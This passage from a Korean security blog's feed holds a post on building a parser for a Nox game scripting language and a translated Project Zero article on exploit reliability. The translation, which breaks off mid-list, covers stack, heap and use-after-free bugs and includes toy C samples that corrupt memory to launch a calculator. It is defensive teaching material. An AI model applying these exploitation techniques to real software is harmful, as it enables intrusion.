		<description><![CDATA[오랜만에 일과는 전혀 상관이 없는.. 하지만 관련 지식과 기술을 사용한 취미겸 사이드 프로젝트를 지난 3일동안 작업했다. 제목에서도 알 수 있듯이 Nox 라는 RPG 게임에 관련된 프로젝트였는데, 애시당초 이 고전(?) 게임을 왜 들여다 본걸까? &#160; Nox&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>오랜만에 일과는 전혀 상관이 없는.. 하지만 관련 지식과 기술을 사용한 취미겸 사이드 프로젝트를 지난 3일동안 작업했다. 제목에서도 알 수 있듯이 <a href="https://en.wikipedia.org/wiki/Nox_(video_game)" title="">Nox</a> 라는 RPG 게임에 관련된 프로젝트였는데, 애시당초 이 고전(?) 게임을 왜 들여다 본걸까?</p>
<p>&nbsp;</p>
<h2>Nox</h2>
<p>일단 Nox는 Westwood Studios에서 만들고 EA가 배급한 윈도우 용 RPG 게임이다. 스토리가 있는 싱글 플레이 모드도 있었고 PvP 등을 할 수 있는 멀티 플레이도 가능했다. 디아블로1 이후에 영감을 받아 나온 게임으로 꽤나 좋은 평가를 받았지만.. 다섯달 이후에 나온 디아블로2의 대성공 속에 사람들이 기억속에서 잊혀지게 된다 ㅠㅠ.. 하지만 내 룸메이트를 비롯한 매니아 층이 존재했고 그..그들은 16여년이 지난 지금까지도 가끔씩 서버를 운영하며 플레이를 한다는&#8230;</p>
<p>나를 포함한 보안쪽에 있는 사람들중 대다수가 그렇듯이 어릴 때 게임 분석을 하면서 자연스레 리버싱에 입문하게 되는 경우가 많은데, 내 룸메이트 역시 고등학교 시절부터 게임에 대한 리버싱 및 알아낸 정보를 이용해 맵 에디터 제작 등, 취미 생활로 이런 저런 툴들을 많이 만들어왔다. 그 중 하나가 맵 스크립트 지원인데, 사실 이때는 리버싱 실력이나 프로그래밍 능력이 지금만큼 없었기 때문에 많이 부족한 (그래도 작동은 얼추 하는?) 결과물을 만들었다고 한다.</p>
<p>&nbsp;</p>
<h2>Current State</h2>
<p>최근에 Nox 게임 포럼 (아직도 90년대 스타일 웹사이트.. ㄷㄷ) 에서 몇몇 한국 분들이 아직 맵 제작 및 플레이를 하신다는걸 알게되었고 우리는 사용되고 있는 스크립트 언어 스펙과 열악한 에디터 환경을 보고 경악을 금치 못했..읍읍. 빌트인 함수 하이라이팅 되는거에 감사해야하나 ㅠㅠ..</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/script_editor.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-2071 " src="https://www.bpak.org/blog/wp-content/uploads/2016/08/script_editor.png" alt="Old Script Editor" width="431" height="440" /></a></p>
<p>그래서, 주말동안 이 부분을 완전 개혁(!)하기로 마음 먹었다. 정확히는 게임 내부에 있는 스크립팅 엔진에서 돌아갈 bytecode 생성을 위한 컴파일러 개발 및 스크립트 언어 개발 환경을 구축하는 작업이었다. 게임에서 사용되는 맵 파일 마다 퀘스트 이벤트 발생, 이펙트 발생 등의 동적인 요소들을 위한 로직을 담기 위해 bytecode를 삽입할 수 있는데, 사실 이 부분은 게임 개발사에서 내부적으로만 사용하기 위해 넣어둔 기능이기 때문에 WoW와 같은 최신 게임들에서 제공하는 &#8216;스크립팅&#8217;과는 조금 차이가 있다. 따로 API나 스크립트 스펙을 공개하지 않았기 때문에 다 손수 리버싱을 해야한다는 점.</p>
<div id="attachment_2074" style="width: 566px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/typical_vm_loop.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-2074" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/typical_vm_loop.png" alt="Typical VM Loop" width="556" height="554" /></a><p class="wp-caption-text">Opcode를 핸들링하는 스크립트 엔진 (vm loop)</p></div>
<p>&nbsp;</p>
<p>일단 작업 시작전에 알아두어야 할 점들은 다음과 같았다:</p>
<ul>
<li>게임 맵에 첨부되는 이 스크립트 코드 (bytecode)는 stack-based VM으로 실행된다. (즉, register-based가 아니란 얘기.)</li>
<li>200여개의 built-in 함수들이 존재한다 &#8212; 물론 이에 대한 공개 API는 존재하지 않는다.</li>
<li>지원하는 자료형 type은 int, float, string, 그리고 object이다.</li>
<li>배열, 지역 변수 및 전역 변수를 지원한다.</li>
</ul>
<p>일단 기존 스크립트 &#8220;언어&#8221;가 해괴망측(&#8230;)했기 때문에 아예 처음부터 새로 설계하기로 했다. 큰 그림을 그려보자면, 세 단계로 구성될 수 있다.</p>
<ol>
<li><strong>새로운 스크립트 언어 설계</strong>: 사용하기 편하고/친근하고 strict typing을 가진 언어로 만들어야 함 &#8212; C-like 언어를 구상.</li>
<li><strong>Parser 구현</strong>: 새로 만든 언어로 작성된 소스코드를 파싱할 수 있는 파서를 제작해야 함 &#8212; Syntax checking 및 AST 생성을 이 단계에서 한다.</li>
<li><strong>Compiler 구현</strong>: 만들어진 AST를 기반으로 올바른 bytecode를 내보내는 컴파일러를 작성해야 함 &#8212; 보통은 assembly/assembler 단계를 거치지만, 우리는 그냥 바로 코드를 emit 한다.</li>
</ol>
<p>우린 둘다 python 빠돌이들이기 때문에 처음부터 끝까지 python을 사용해서 컴파일러 제작을 했다.</p>
<p>&nbsp;</p>
<h2>Nox Script 3.0</h2>
<p>초창기에 룸메이트&amp;크루가 만든 스크립트 언어를 1.0이라고 보고, 그 사이에 누군가 언어를 약간 변형시킨것을 2.0이라고 판단하여.. 이번에 작업한 새로운 언어는 3.0이라고 정하게 되었다.</p>
<p>&#8216;C와 비슷하면서 스크립팅에 적합한 훨씬 간략한 언어가 없을까&#8217; 하며 찾아보던 중 &#8220;<a href="http://www.compuphase.com/pawn/Pawn_Language_Guide.pdf" title="">Pwan</a>&#8220;이라는 스크립트 언어를 발견하게 되었는데, 언어 특성상 그대로 사용하지는 못하고 여러 부분 영감을 얻어 Nox 스크립트 환경에 맞게 언어를 설계했다.</p>
<h4>타입</h4>
<ul>
<li>int</li>
<li>float</li>
<li>string</li>
<li>object</li>
</ul>
<p>우선 언어에서 사용가능한 타입은 총 네가지다. int와 float 타입은 C와 같고, string 타입은 내부적으로는 string table안에 보관되는 문자열을 레퍼런스 한다. 마지막으로 object 타입은 opaque 타입으로서 Nox내의 객체와는 다른 녀석이다. Nox Script에서 게임 객체는 항상 게임 내의 object id (int 타입)를 통해 레퍼런스 된다. 즉, 내부적으로는 object는 int로 관리되지만 잘못 사용하는 경우를 방지하기 위해 strict typing을 통해서 object 타입으로 관리하기로 결정. 이 opaque 타입을 상대로 적용할 수 있는 연산자는 대입 연산자 (=), 동등 연산자 (==), 그리고 비등 연산자 (!=) 뿐이다.</p>
<h4>연산자</h4>
<p><img class="aligncenter size-full wp-image-2049" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/supported_operators.png" alt="Supported Operators" width="547" height="409" /></p>
<p>int나 float 타입에 대해선 기본적 산술 연산자들 및 비교 연산자들이 사용 가능하고, bitwise나 logical 연산은 int 타입에서만 가능하다. 또한, 문자열을 합칠 수 있는 + 연산자와 += 연산자도 지원한다. 사실 여기서 지원하는 모든 타입/연산자들 각각에 해당하는 VM opcode가 존재하기 때문에, 굳이 컴파일러 단에서 우리가 구현할 필요는 없었다. (맞는 opcode를 emit하고 데이터를 스택에 push 해주기만 하면 되니까)</p>
<h4>Literal (리터럴)</h4>
<p>Nox Script 3.0에서는 총 세 종류의 리터럴 타입을 제공한다: int, float, 그리고 문자열. 문법은 C와 비슷하다.</p>
<p>int형 리터럴은 8진수, 10진수, 혹은 16진수로 되어있는 숫자이고, 16진수는 0x로 시작하고 8진수는 0으로 시작한다. 또한, true와 false 키워드도 제공하는데, 이는 각각 1과 0의 값을 가진다.</p>
<p>float형 리터럴은 보통의 부동소숫점인 1.0 형태나 e-notation을 사용하는 1.0e2 형태로 사용할 수 있다. float형 리터럴은 항상 소숫점 (.)이 존재해야한다. 타입캐스팅을 지원하지 않기 떄문에 int형과 float형 사이에 모호성을 없애야하기 때문이다.</p>
<p>마지막으로 string 리터럴은 C에서의 스트링과 같다. 한 쌍의 큰 따옴표 (&#8220;)로 감싸져 있으며, escape이 필요한 문자는 백슬래쉬(\)를 사용하여 escape가능하다.</p>
<h4>변수</h4>
<p>C와 마찬가지로 모든 변수는 정적 타입을 가진다. 또한, 전역 혹은 함수 범위 (scope) 내에서 동일한 변수 명은 가질 수 없다. 함수 밖에서 정의된 변수는 전역 변수로 처리되며, 어느 함수에서든 값을 참조하거나 변경할 수 있다. 함수 내의 변수는 block scope (즉, { } 안 마다 새로운 범위 설정)을 가진다.</p>
<p>변수 선언은 <strong><em>타입 변수명;</em></strong> 으로 한다 (예: int var;). 또한, 변수 선언과 동시에 값을 할당할 수 있다: <em><strong>타입 변수명 = 값;</strong></em></p>
<p>배열 변수 선언도 가능하다: <em><strong>타입 변수명[배열크기];</strong></em> 배열의 크기는 1보다 커야한다 (Nox 내부 구현 때문에..)</p>
<h4>함수</h4>
<p>모든 함수는 global scope에 정의되며, 함수명은 유니크해야하고 built-in 함수명과 겹칠 수 없다. 함수는 값을 리턴할 수 있고 인자를 받을 수 있다. 함수가 아무것도 리턴하지 않는다면 void 타입으로 명시해야한다.</p>
<p>함수 선언 역시 C와 비슷하다: <em><strong>타입 함수명(타입 인자1, 타입 인자2, &#8230;) { }</strong></em></p>
<p>정의된 함수는 호출될 수 있고 문법은 다음과 같다: <em><strong>함수명(인자1, 인자2, &#8230;)</strong></em></p>
<p>만약 호출하는 함수가 값을 리턴한다면 expression 내에서 사용가능하다. (예: <em>if (myFunc(123, &#8220;abcd&#8221;)) {}</em>)</p>
<h4>제어 흐름</h4>
<p>기본적인 제어문들이 제공된다: <strong>if/else</strong>문, <strong>for</strong>문, 그리고 <strong>while</strong>문. 또한, <strong>label</strong> 정의와 <strong>goto</strong>문이 제공되지만 정말 필요할 때가 아니면 사용을 권장하지 않는다.</p><pre class="crayon-plain-tag">if (cond1)
{
}
else if (cond2)
{
}
else
{
}

for (initialization; condition; afterthought)
{
}

while (condition)
{
}</pre><p>
&nbsp;</p>
<h2>Pyparsing</h2>
<p>이제 언어의 스펙을 정했으므로, 이 언어를 파싱할 파서를 제작해야한다. 이번 프로젝트에는 <a href="http://pyparsing.wikispaces.com/" title="">pyparsing</a>을 사용하기로 했다.</p>
<p>Pyparsing의 기본적인 기능들을 나열해보자면:</p>
<ul>
<li>yacc이나 bison 같이 <a href="https://en.wikipedia.org/wiki/Backus%E2%80%93Naur_Form" title="">BNF</a>를 기반으로 parser 코드를 생성하는 것과는 다르게, 언어 문법 정의 및 파싱을 동시에 할 수 있다.</li>
<li>파싱된 결과물인 token들을 <strong>setParseAction</strong> 등의 함수를 통해 처리할 수 있다.</li>
<li>Packrat 기능을 활성화 함으로서 내부적으로 memoization을 통해 (간단한 코드의) 파싱 속도를 매우 높일 수 있다.</li>
</ul>
<p>사용법은 꽤 간단하다.</p>
<p>일단 있는 그대로 읽혀야할 리터럴 캐릭터/문자열들은 <strong>Literal</strong>로 매칭할 수 있다. <strong>Keyword</strong>는Literal과 비슷하지만, 바로 이후에 공백문자 (whitespace) 혹은 non-keyword가 와야한다. 이 외에도 <strong>Word</strong> 나 <strong>Regex</strong> 등을 통해 변수/함수명 (identifier)를 매칭할 수 있다.</p>
<p>제공하는 연산자는 크게 다음과 같다:</p>
<ul>
<li><strong>|</strong> (MatchFirst): 첫번째로 매칭되는 녀석을 반환한다.</li>
<li><strong>+</strong> (And): 각 expression들이 모두 매칭되어야 하고, 매칭되는 녀석을 통째로 반환한다 (파싱된 각 expression의 내용이 담긴 list).</li>
<li><strong>&#8211;</strong> (And): +와 같지만 backtracking을 하지 않는다 (만약 매칭에 실패했을 경우 다른 룰을 통해 매칭하려고 시도하지 않는다. 에러 표시에 유용).</li>
<li><strong>~</strong> (NotAny): 주어진 expression이 포함되지 않아야 한다.</li>
<li><strong>&lt;&lt;</strong>: 해당 expression을 Forward를 사용하여 선정의 (forward declaration) 했을 경우에 실제 정의/룰을 추가한다.</li>
</ul>
<p>연산자 우선 순위가 중요한 operator 같은 경우에는 <strong>infixNotation</strong>을 사용해서 간단히 처리 가능하다. 하지만, 나중 시리즈에서 얘기하겠지만 이것 때문에 빅엿을 먹는 사태가 발생한다 ㅠㅠ.. 사용하긴 쉽고 직관적이지만 치명적으로 느리다.. (이건 뭐 Packrat으로 해결되는 수준이 아님..) Operator precedence 라인이 한 줄 추가 될 때마다 거의 기하 급수적으로 느려진다. 급기야 1400 여줄 짜리 소스를 파싱하는데만 30초 이상 걸리게 되어서 나중에 이 부분은 다익스트라 횽님이 발명하신 <a href="https://en.wikipedia.org/wiki/Shunting-yard_algorithm" title="">Shunting-yard 알고리즘</a>을 사용해서 구현하게 된다&#8230;orz</p>
<p><strong>Group</strong>을 사용하면 매칭을 통해 파싱된 녀석들을 한 그룹(list)으로 묶어준다.</p>
<p>Recursive grammar (재귀 문법)을 정의해야할 때, <strong>Forward</strong>를 이용해서 사용되는 특정 expression을 정의하기 전에 미리 선언할 수 있다.</p>
<p>또한,<strong> Suppress</strong>로 감싸게 되면 매칭이 되어도 해당 토큰은 반환되지 않는다. 말그대로 그냥 읽씹(?) 당한다. 신택스 상으로는 중요하지만 시맨틱 상에선 중요하지 않은 괄호나 세미콜론 등에 사용하기에 좋다.</p><pre class="crayon-plain-tag">from pyparsing import *
ParserElement.enablePackrat()

# increase the recursion limit
import sys
sys.setrecursionlimit(5000)

LPAREN = Suppress(Literal('('))
RPAREN = Suppress(Literal(')'))
NEG = Literal('-')
SEMICOLON = Suppress(Literal(';'))
LBRAC = Suppress(Literal('['))
RBRAC = Suppress(Literal(']'))

# built-in constants
true = Keyword('true')
false = Keyword('false')
self = Keyword('self')
other = Keyword('other')

vartype = Keyword('int') | Keyword('float') | Keyword('string') | Keyword('object')
name = Word(alphas + '_', alphanums + '_', asKeyword=True)
qs = QuotedString('"', escChar='\\')
integer = (Regex(r'0x[0-9a-fA-F]+') | Regex(r'\d+'))
fp = Regex(r'\d+(\.\d*)([eE]\d+)?')
literal = (qs | fp | integer)
vardecl = (vartype + name + Optional(LBRAC + integer + RBRAC))
funccall = Forward()
arrexpr = Forward()
expr = infixNotation(arrexpr | funccall | true | false | self | other | Group(name) | literal,
        [
            (oneOf('- ! ~'), 1, opAssoc.RIGHT),
            (oneOf('* / %'), 2, opAssoc.LEFT),
            (oneOf('+ -'), 2, opAssoc.LEFT),
            (oneOf('&lt;&lt; &gt;&gt;'), 2, opAssoc.LEFT),
            (~Literal('&amp;&amp;') + '&amp;', 2, opAssoc.LEFT),
            (oneOf('^'), 2, opAssoc.LEFT),
            (~Literal('||') + '|', 2, opAssoc.LEFT),
            (oneOf('&lt; &lt;= &gt; &gt;='), 2, opAssoc.LEFT),
            (oneOf('== !='), 2, opAssoc.LEFT),
            (oneOf('&amp;&amp;'), 2, opAssoc.LEFT),
            (oneOf('||'), 2, opAssoc.LEFT),
            (oneOf('= += -= *= /= %= &lt;&lt;= &gt;&gt;='), 2, opAssoc.RIGHT),
        ])
args = Optional(delimitedList(expr))
funccall &lt;&lt; (name + LPAREN - args - RPAREN)
arrexpr &lt;&lt; (name + LBRAC - expr - RBRAC)
assign = (vartype + name + Suppress(Literal('=')) - expr)
blockstmt = Forward()
ifstmt = Forward()
whilestmt = Forward()
forstmt = Forward()
label = (name + Suppress(Literal(':')))
goto = (Suppress(Keyword('goto')) - name)
retstmt = (Suppress(Keyword('return')) - Optional(expr))
statement = Optional(label) + (blockstmt | ifstmt | whilestmt | forstmt | ((
    retstmt  |
    Keyword('continue') |
    Keyword('break') |
    goto |
    assign |
    vardecl |
    expr
    ) + SEMICOLON))
blockstmt &lt;&lt; Suppress(Literal('{')) - Group(ZeroOrMore(statement) - Optional(label)) - Suppress(Literal('}'))
elsestmt = Suppress(Keyword('else')) - statement
ifstmt &lt;&lt; (Suppress(Keyword('if')) - LPAREN - expr - RPAREN - statement - Optional(elsestmt))
whilestmt &lt;&lt; (Suppress(Keyword('while')) - LPAREN + expr + RPAREN + statement)
forstmt &lt;&lt; (Suppress(Keyword('for')) - LPAREN + Optional(expr, None) + SEMICOLON +
                 Optional(expr, None) + SEMICOLON +
                 Optional(expr, None) + RPAREN + statement)
argdecl = (vartype + name)
funcdecl = (Keyword('void') | vartype) + name + LPAREN - Optional(delimitedList(argdecl)) + RPAREN
func = (funcdecl - statement)

grammar = ZeroOrMore(func | (vardecl + SEMICOLON) | (assign + SEMICOLON))
grammar.ignore(cppStyleComment)

def gen_ast(code):
    root = grammar.parseString(code, True)
    return root

if __name__ == '__main__':
    import sys
    print gen_ast(open(sys.argv[1], 'rb').read())</pre><p>
간단한 코드로 테스팅을 해보자!</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/parser.png" data-rel="lightbox-image-2" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-2068" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/parser.png" alt="parser.py" width="643" height="464" /></a></p>
<p>우왕! 파싱 성공! +_+</p>
<p>100여줄도 안되는 코드로 C-like (사실 C보다는 훠어어얼씬 간단하지만..) 언어 소스코드를 파싱할 수 있는 파서를 작성 가능하다는 점이 경이롭다. 파이썬 만세. Pyparsing 만세. (하지만 넌 나에게 나중에 똥을 주었지.)</p>
<p>&nbsp;</p>
<h2>Next: Source Code to AST (Abstract Syntax Tree)</h2>
<p>몇 번의 시행착오 및 테스팅을 통해 마침내 parser를 완성하고 나면, <strong>setParseAction</strong>을 통해 파싱된 token들을 가지고 뭘 할건지 정해주어야 한다.</p>
<p>우리는 컴파일러를 만들 계획이므로(!) 파싱 결과를 가지고 <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">AST</a> node들을 만들어줘야 한다.<br />
그렇다. 이제 겨우 시작일 뿐이다. (주륵)</p>
<p>AST node 설계 및 구현은 다음 시리즈에서 계속&#8230;!!</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-1/feed/</wfw:commentRss>
		<slash:comments>1</slash:comments>
		</item>
		<item>
		<title>[번역] What is a &#8220;good&#8221; memory corruption vulnerability? (Project Zero)</title>
		<link>https://www.bpak.org/blog/2015/07/%eb%b2%88%ec%97%ad-what-is-a-good-memory-corruption-vulnerability-project-zero/</link>
		<comments>https://www.bpak.org/blog/2015/07/%eb%b2%88%ec%97%ad-what-is-a-good-memory-corruption-vulnerability-project-zero/#comments</comments>
		<pubDate>Fri, 03 Jul 2015 08:59:14 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Computer in General]]></category>
		<category><![CDATA[Hacking/Study]]></category>
		<category><![CDATA[Blog]]></category>
		<category><![CDATA[Memory Corruption]]></category>
		<category><![CDATA[Project Zero]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[번역]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=1991</guid>
		<description><![CDATA[Part 1 of 4. Written by Chris Evans from Project Zero, Google. (Original Post) Translated by Brian Pak (Cai) &#8220;좋은&#8221; 메모리 코럽션 취약점은 무엇인가? 소프트웨어에는 많은 메모리 코럽션 (변조) 취약점들이 존재하지만, 모두 다 같은&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>Part 1 of 4. Written by Chris Evans from Project Zero, Google. (<a href="http://googleprojectzero.blogspot.com/2015/06/what-is-good-memory-corruption.html" target="_blank" title="">Original Post</a>)</p>
<p>Translated by Brian Pak (Cai)</p>
<hr />
<h2>&#8220;좋은&#8221; 메모리 코럽션 취약점은 무엇인가?</h2>
<p>소프트웨어에는 많은 메모리 코럽션 (변조) 취약점들이 존재하지만, 모두 다 같은 영향력을 가지진 않는다. 주어진 메모리 코럽션 버그의 &#8220;유용함&#8221;은 어떻게 보면 이 버그를 얼마나 안정적(reliable)으로 익스플로잇 할 수 있느냐로 결정할 수 있는데, 운이 좋은 케이스에서는 버그를 100% 안정적으로 익스플로잇 할 수 있다.</p>
<p>이번 블로그 시리즈에서는, 우리 버그 트랙커에 공개된 최근 버그들을 예제로 활용하여 어떤 종류의 메모리 코럽션 취약점들이 100% 안정적으로 익스플로잇 가능한지에 대해서 알아볼 것이다. 이러한 연구와 자료들을 보안 커뮤니티에 제공함으로써, 관련 공격들에 대한 방어를 좀 더 수월하게 하려한다. 안정적인 익스플로잇을 위해 사용된 툴들과 기술들을 공부 및 연구함으로 새로운 방어기법 뿐만 아니라 현존하는 기법들을 더 보완하는데에도 유용하게 사용될 수 있다. 예를 들어, 아래에서는 타입 컨퓨젼 (type confusion) 취약점들이 왜 엄청 위험할 수 있는지에 대해서 설명하고, 이를 막기 위한 컴파일러단의 보호 기법을 고안해본다.</p>
<p>&nbsp;</p>
<p><strong>&#8220;안정적&#8221;이다라는게 무슨 뜻이지?</strong><br />
처음에는 좀 바보같은 질문으로 들릴지 모르겠지만, 사실 &#8220;안정적&#8221;이다라는데는 여러가지 의미가 있을 수 있다. 여기서 지금 &#8216;이게 올바른 정의이다&#8217;라는 것을 말하고자 하는건 아니고, &#8220;안정성&#8221;에 대해서 이야기할 때 고려해봐야하는 질문들을 몇 가지 나열해본다:</p>
<ul>
<li>익스플로잇이 항상 크래쉬를 유발하는가? &#8211; 이게 아마 공격자 입장에서 봤을때는 최악의 결과일거다: 크래쉬는 발견되기 쉽기 때문이다.</li>
<li>익스플로잇이 실패시 깔끔하게 처리되는가? &#8211; 우린 이걸 &#8220;aborting&#8221; 한다고 부르는데, 익스플로잇은 실패했지만 크래쉬나 발견될만한 흔적을 남기지 않고 깨끗하게 종료되는것을 뜻한다.</li>
<li>익스플로잇이 각기 다른 패치 상태에서도 잘 작동하는가?</li>
<li>익스플로잇이 EMET, Grsecurity, 또는 안티바이러스 제품들과 같은 추가적인 보안/보호 소프트웨어의 존재 아래서도 작동하는가?</li>
<li>익스플로잇이 특이한 환경을 맞닥뜨렸을때 어떻게 작동하는가? 성공할건가, 크래쉬를 낼건가, 아니면 abort할 것인가?</li>
<li>익스플로잇이 크로스 플랫폼, 그리고 크로스 버전인가?</li>
<li>익스플로잇이 꽤나 안정적인 &#8220;실행의 연속 (continuation of execution)&#8221; 속성을 가지고 있는가? 예를 들어, post-exploitation을 진행하는데 지장이 없고 다른 눈에 띄는 현상들은 없는가?</li>
</ul>
<p>이런 다양하고 복잡한 면들을 봤을때, 이 글에서 &#8220;100% 안정적이다&#8221;라고 하는게 무슨 뜻인지 정의를 하는게 좋겠다. 여기서 &#8220;100% 안정적인&#8221; 익스플로잇 이라는것은:</p>
<ol>
<li>결정적(deterministic)이고 완전히 설명가능 한 스텝들로, 어떤 특정 버전 및 환경에 대해서는 익스플로잇의 성공이 보장되고;</li>
<li>성공하지 못할 경우, 최소한 위에서 언급된 안정성을 위협하는 요소들을 발견하고 크래쉬가 아닌 abort 상태로 만들 수 있는 컨트롤을 허락하는 익스플로잇을 말한다.</li>
</ol>
<p>&nbsp;</p>
<p><strong>버그 종류: 스택 코럽션</strong><br />
스택 쿠키나 스택 변수 순서 재배치와 같은 최신 컴파일러 보안 기법들의 존재에도 불구하고, 익스플로잇 관점에서 봤을때 흥미로운 스택 코럽션 버그들을 구경하곤 한다. 예를 들어, <a href="https://code.google.com/p/google-security-research/issues/detail?id=291" target="_blank" title="">bug 291</a>에선 오픈소스 JPEG XR 이미지 디코더에 존재했던 꽤나 재밌는 스택 코럽션에 대해서 설명한다. 여기서는 스택 배열의 인덱싱 오류가 스택쿠키를 &#8220;건너뛰어&#8221; 데이터를 쓸 수 있게 해주는 덕분에 스택 보호 기법들을 우회할 수 있었다. 공개된 PoC는 안정적으로, 심지어 결정적으로(deterministically), ebp의 값을 0xffffffef로 변조 한 뒤 크래쉬를 낸다. 이러한 점은 이 버그를 어느정도 안정적으로 익스플로잇 할 수 있다는걸 뜻한다.</p>
<p>스택 코럽션 버그들로는 대게 100% 안정적인 익스플로잇으로 만들 수 있는데, 이는 취약점을 트리거하는 시점에 스택 메모리가 보통 일관적이기 때문이다. 아래 샘플 코드는 스택 코럽션을 통해서 간단히 계산기를 띄우는 것을 보여준다. 만약 첫번째에 제대로 작동했다면, 또 다시 시도해도 작동할 것이다!</p><pre class="crayon-plain-tag">// Fedora 20 x64: gcc -fstack-protector ./stack.c
void subfunc() {
    char buf[8];
    buf[16] = 1;
}


int main() {
    int run_calc = 0;
    subfunc();
    if (run_calc) execl("/bin/gnome-calculator", 0);
}</pre><p>
&nbsp;</p>
<p><strong>버그 종류: 힙 블럭간 오버플로우 또는 코럽션</strong><br />
아마 우리가 가장 많이 보는 취약점 부류일거다. 힙에 할당된 메모리 영역을 넘어서 데이터를 쓰게 되는 경우에는 대부분 익스플로잇 가능하다. 하지만, 그러한 취약점이 100% 안정적인 익스플로잇이 되는 경우는 드물다. 예전에 한번 가능한 적이 있긴 했는데, 바로 <a href="http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" title="">off-by-one heap overflow in glibc</a> 이 녀석이다. 사실 이건 극히 드문 케이스인데, 왜냐하면 공격 대상이 익스플로잇 시점에 힙 메모리 영역 상태가 항상 같았던 커맨드라인 바이너리였기 때문이다. 훨씬 더 흔한 경우는 공격자가 전혀 그 상태를 모르는 힙을 공격하는 시나리오다 &#8212; 원격 서비스라던지, 웹 브라우져의 렌더러 혹은 커널 같은 맥락에서 말이다.</p>
<p>전혀 알지 못하는 힙 상태에서, 익스플로잇 과정에 도움이 되도록 힙 조각들을 (예측 가능하도록) 라인업 시키는게 목적인 &#8220;heap grooming&#8221; 이라는 기법이 있긴하다. Project Zero 블로그를 뒤져보면 <a href="http://googleprojectzero.blogspot.com/2014/07/pwn4fun-spring-2014-safari-part-i_24.html" target="_blank" title="">Safari 익스플로잇</a>이라던가, <a href="http://googleprojectzero.blogspot.com/2015/02/exploitingscve-2015-0318sinsflash.html" target="_blank" title="">Flash regex 익스플로잇</a>, 혹은 <a href="http://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html" target="_blank" title="">Flash 4GB-out-of-bounds 익스플로잇</a>과 같은 훌륭한 예제들을 찾을 수 있다.  Heap grooming을 통해서 꽤 안정적인 익스플로잇을 만들어낼 수는 있지만, 이 기술 자체에 보통 확률적인 요소가 여전히 존재하기 때문에 100% 안정적인 익스플로잇이라고 하기엔 부족한 감이 있다.</p>
<p>아래 코드 샘플이 결정성 (determinism)과 비결정성 (non-determinism)을 보여주는 예제다:</p><pre class="crayon-plain-tag">// Fedora 20 x64: gcc ./interheap.c; n=0; while true; do ./a.out; done
int main(int argc, const char* argv[]) {
    void* ptrs[1024];
    int i;
    void* ptr1;
    int *run_calc;
    int seed = (argc &gt; 1) ? atoi(argv[1]) : getpid();
    srandom(seed); printf("seed: %d\n", seed);  // ./a.out 21526 pops.
    for (i = 0; i &lt; 1024; ++i) ptrs[i] = malloc(random() % 1024);
    for (i = 0; i &lt; 1024; ++i) if (random() % 2) free(ptrs[i]);
    ptr1 = malloc(128); run_calc = malloc(128);
    *run_calc = 0;
    memset(ptr1, 'A', 4096);
    if (*run_calc) execl("/bin/gnome-calculator", 0);
}</pre><p>
주어진 머신위에서 특정한 시드 (seed)값을 던져주면 힙은 보통 같은 상태(state)로 정렬되기 마련인데 이건 커맨드라인 바이너리들은 매번 새로운 힙으로 시작하기 때문이다. (사실 영향을 주는 모든 가능한 변수들을 고려한것은 아니기 때문에, 이러한 상태를 결정적이다고 말하는건 그만하도록 하겠다. 그리고 같은 리눅스 운영체제를 설치한다고 해도 설치된 라이브러리에 따라서 동적링커의 malloc 패턴이 달라지거나 할 수 있다는 점도 염두해두자.) 어쨋든, 위의 코드를 돌리면 어떤 힙 레이아웃에서는 계산기를 띄울 것이고, 어떤 힙 레이아웃에서는 아무일도 일어나지 않을것이다.</p>
<p>&nbsp;</p>
<p><strong>버그 종류: use-after-free</strong><br />
Use-after-free 취약점은 아주 안정적인 익스플로잇으로 연결될 수 있다. 특히, &#8220;free&#8221;와 &#8220;use&#8221;가 붙어있거나 공격자가 스크립팅 언어를 통해서 free를 트리거할 수 있을 경우엔 더욱 말이다. 익스플로잇의 안정성은 대부분 요즘의 힙 할당자(heap allocator)들이 구현되어있는 방식 때문이다: 만약 사이즈 X의 오브젝트가 free되었다면, 보통 이 영역의 메모리가 다음에 사이즈 X만큼 할당할 때 사용된다. 이러한 방식은 &#8220;cache hot&#8221;한 메모리 영역 사용을 극대화 해준다. 하지만, 엄청 결정적이게 만들기도 하는 요소이기도 하다. 좋은 Use-after-free 익스플로잇 공부거리를 찾는다면 2013년에 공개된 이 <a href="http://scarybeastsecurity.blogspot.com/2013/02/exploiting-64-bit-linux-like-boss.html" target="_blank" title="">Pinkie Pie 익스플로잇</a>을 보면 될듯 싶다. 해당 익스플로잇에 엄청 비결정적인 부분들이 많긴 하지만, step 2를 보면 free된 오브젝트가 어떻게 유용하게, 그리고 deterministic하게 사용되었는지 보여준다.</p>
<p>하지만, use-after-free 버그들이 100% 안정성을 가진 익스플로잇을 위한 완벽한 기반은 아니다. 일반적인 문제점들을 짚어보면:</p>
<ul>
<li>Threading (쓰레딩). 힙의 구현체에 따라서, 때론 두 번째 쓰레드가 익스플로잇이 진행중인 쓰레드에서 사용되야할 free된 메모리를 먼저 집어갈 수도 있다.</li>
